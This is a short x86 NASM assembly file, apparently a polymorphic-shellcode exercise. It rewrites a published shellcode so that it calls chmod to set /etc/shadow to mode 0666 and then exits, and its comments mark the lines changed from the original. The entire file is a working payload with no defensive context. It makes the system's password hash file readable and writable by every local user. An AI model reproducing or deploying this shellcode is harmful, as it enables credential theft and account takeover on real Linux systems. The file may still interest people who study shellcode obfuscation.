;Filename: chmod.nasm
;Nasm code obtained from: http://shell-storm.org/shellcode/files/shellcode-566.php
;Polymorphic version author: MrSquid

;Original Lenght: 25

;Polymorphic version: 24 with good exit

global _start 

section .text

_start:

        ; chmod("//etc/shadow", 0666);
        ;mov al, 0xf ;15  Original line
	push 0xf ;Mofidied line
	pop eax  ;Modified line       
	;cdq
        push ecx;push edx
        push dword 0x776f6461
	push dword 0x68732f63
        push dword 0x74652f2f
        mov ebx, esp
        ;mov cx, 0666o ;Original line
	push 0x1b6
	pop ecx    
	int 0x80
	push 0x1
	pop eax
	;Original code doesnt have exit function
	int 0x80 

